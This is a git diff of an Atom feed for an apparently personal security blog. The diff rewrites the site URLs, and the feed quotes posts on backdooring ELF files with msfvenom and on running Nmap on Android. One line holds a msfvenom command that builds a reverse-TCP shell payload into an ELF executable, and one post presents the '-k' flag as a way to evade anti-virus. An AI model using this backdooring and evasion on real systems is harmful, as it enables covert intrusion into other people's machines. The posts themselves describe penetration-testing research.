@@ -2,10 +2,10 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
 
   <title><![CDATA[Category: projects | Sheep Shellcode]]></title>
-  <link href="http://sheepshellcode.com/blog/categories/projects/atom.xml" rel="self"/>
-  <link href="http://sheepshellcode.com/"/>
-  <updated>2016-04-12T20:58:40-04:00</updated>
-  <id>http://sheepshellcode.com/</id>
+  <link href="http://quantumvm.github.io//github/blog/categories/projects/atom.xml" rel="self"/>
+  <link href="http://quantumvm.github.io//github/"/>
+  <updated>2016-04-12T21:04:45-04:00</updated>
+  <id>http://quantumvm.github.io//github/</id>
   <author>
     <name><![CDATA[Vincent Moscatello]]></name>
     
@@ -15,9 +15,9 @@
   
   <entry>
     <title type="html"><![CDATA[Improving Msfvenom Part--1]]></title>
-    <link href="http://sheepshellcode.com/blog/2014/10/28/improving-msfvenom-project/"/>
+    <link href="http://quantumvm.github.io//github/blog/2014/10/28/improving-msfvenom-project/"/>
     <updated>2014-10-28T01:55:16-04:00</updated>
-    <id>http://sheepshellcode.com/blog/2014/10/28/improving-msfvenom-project</id>
+    <id>http://quantumvm.github.io//github/blog/2014/10/28/improving-msfvenom-project</id>
     <content type="html"><![CDATA[<p>This is  a progress/update on one of my current projects: improving the metasploit framework. In this part I am only doing reverse engineering/analysis of how msfvenom currently backdoors ELF files. This is all in an effort to add the “-k” functionality to ELF executables, the windows equivalent of an exe.</p>
 
 <p>The -k flag is used by msfvenom to start a new thread for a payload that has been backdoored in an executable. This allows an attacker to preserve the original functionality of an executable while still executing the generated shellcode. This can come in quite handing for evading anti-virus. Unfortunately this feature is only available on 32-bit windows executables and msfvenom won&rsquo;t throw an error when you use this flag on a wrong file format.</p>
@@ -70,9 +70,9 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=31337 -f elf -k -x
   
   <entry>
     <title type="html"><![CDATA[Nmap on Android]]></title>
-    <link href="http://sheepshellcode.com/blog/2014/10/11/nmap-on-android/"/>
+    <link href="http://quantumvm.github.io//github/blog/2014/10/11/nmap-on-android/"/>
     <updated>2014-10-11T20:00:56-04:00</updated>
-    <id>http://sheepshellcode.com/blog/2014/10/11/nmap-on-android</id>
+    <id>http://quantumvm.github.io//github/blog/2014/10/11/nmap-on-android</id>
     <content type="html"><![CDATA[<p>This weekend, I got my first smart phone an Android LGLS740. What I love about android is that it is a Linux based operating system at its core. The very first application I went to download on it was Terminal Emulator for Android (<a href="https://play.google.com/store/apps/details?id=jackpal.androidterm&amp;hl=en">https://play.google.com/store/apps/details?id=jackpal.androidterm&amp;hl=en</a>). This effectively makes the phone a low spec computer you can carry in your pocket.</p>
 
 <p>Although most of applications for android are written in java, It seemed logical that an ELF file should still be able to run so long as I compiled it for the right processor. I explored android&rsquo;s settings for cpu info but eventually gave up. I was a bit surprised I wasn&rsquo;t able to find this information under the &ldquo;Hardware information&rdquo; setting. I figured it would be much faster to just cat the cpuinfo file in the file system using the terminal app.</p>
